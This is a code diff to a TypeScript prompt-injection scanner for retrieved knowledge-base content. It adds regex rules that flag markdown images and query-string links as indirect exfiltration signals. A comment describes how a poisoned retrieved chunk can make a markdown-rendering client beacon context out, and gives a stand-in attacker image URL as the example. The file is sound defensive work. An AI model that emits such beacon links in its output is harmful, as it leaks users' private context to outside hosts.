@@ -23,7 +23,7 @@ import {
   isZeroWidthControl,
 } from './injection-guard.js';
 
-export const KB_SHIELD_RULESET_VERSION = 'v2';
+export const KB_SHIELD_RULESET_VERSION = 'v3';
 
 export interface InjectionSignal {
   rule: string;
@@ -78,6 +78,41 @@ const RULES_V1: ReadonlyArray<RuleSpec> = [
   },
 ];
 
+// v3 markdown URL-sink rules (issue #991). Same regex mechanism as RULES_V1
+// and scanned immediately after it, so every v1 span and rule ID is unchanged;
+// the only observable effect is two new `IndirectExfil.*` IDs and the
+// `KB_SHIELD_RULESET_VERSION` bump to `v3`.
+//
+// A markdown-rendering MCP client auto-fetches an image URL (and will follow a
+// planted link), so a poisoned retrieved chunk can beacon out context through
+// an `![x](https://attacker/leak?d=…)` image or a query-string-bearing link —
+// the canonical RAG exfiltration channel that previously produced zero signals.
+//   * MarkdownImage flags any image whose target is a remote (`http`/`https`)
+//     or `data:` URL, because the render auto-fetches it regardless of query.
+//   * MarkdownLink is biased toward exfiltration-shaped targets to limit false
+//     positives: an inline `[...](http…?…)` link carrying a query string, or a
+//     `<http…?…>` autolink. Relative/anchor links (`[d](./x.md)`, `[a](#h)`)
+//     and query-less external links do not match.
+const MARKDOWN_RULES_V3: ReadonlyArray<RuleSpec> = [
+  {
+    id: 'IndirectExfil.MarkdownImage',
+    pattern: /!\[[^\]]*\]\(\s*(?:https?:|data:)[^)]*\)/gi,
+  },
+  {
+    id: 'IndirectExfil.MarkdownLink',
+    // First alternative: inline link, excluded from images via `(?<!!)` so an
+    // image is only ever reported once (as MarkdownImage). Requires an http(s)
+    // target with a `?` query string. Second alternative: an autolink whose
+    // target carries a query string.
+    pattern: /(?<!!)\[[^\]]*\]\(\s*https?:\/\/[^)\s]*\?[^)]*\)|<https?:\/\/[^>\s]*\?[^>]*>/gi,
+  },
+];
+
+// Every regex-based rule, in scan and enumeration order: the frozen v1 set
+// followed by the v3 markdown additions. New rule families append here so v1
+// IDs, spans, and their relative order stay stable for downstream consumers.
+const REGEX_RULES: ReadonlyArray<RuleSpec> = [...RULES_V1, ...MARKDOWN_RULES_V3];
+
 const CONTROL_RULES_V2 = [
   { id: 'Obfuscation.ZeroWidth', matches: isZeroWidthControl },
   { id: 'Obfuscation.BidiControl', matches: isUnicodeBidiControl },
@@ -101,7 +136,7 @@ const CONTROL_RULES_V2 = [
 export function scanForInjectionSignals(content: string): InjectionSignal[] {
   if (typeof content !== 'string' || content.length === 0) return [];
   const signals: InjectionSignal[] = [];
-  for (const { id, pattern } of RULES_V1) {
+  for (const { id, pattern } of REGEX_RULES) {
     // `matchAll` clones the regex internally, so the shared module-level
     // pattern stays stateless across calls. The cast keeps the iterator
     // contract narrow even though `g` is statically present.
@@ -157,5 +192,5 @@ export function getInjectionSignals(content: string): InjectionSignal[] | undefi
  * wants to validate `injection_signals[].rule` against the known set.
  */
 export function listRuleIds(): string[] {
-  return [...RULES_V1, ...CONTROL_RULES_V2].map((r) => r.id);
+  return [...REGEX_RULES, ...CONTROL_RULES_V2].map((r) => r.id);
 }
